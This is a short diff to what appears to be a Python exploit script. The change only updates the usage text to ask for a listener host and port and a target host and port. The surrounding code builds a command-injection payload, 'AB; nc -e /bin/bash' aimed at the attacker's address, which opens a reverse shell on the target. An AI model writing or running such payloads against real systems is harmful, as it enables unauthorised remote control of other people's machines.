@@ -8,7 +8,7 @@ import time
 
 def exploit():
     if len(sys.argv) < 5:
-        sys.exit('BUUUMBA-CLARRRT!\n\nUsage: %s' % sys.argv[0])
+        sys.exit('BUUUMBA-CLARRRT!\n\nUsage: %s lhost lport rhost rport' % sys.argv[0])
     
     payload="AB; nc -e /bin/bash "+sys.argv[1]+" "+sys.argv[2]+" &"
     print("[*] payload: "+payload)
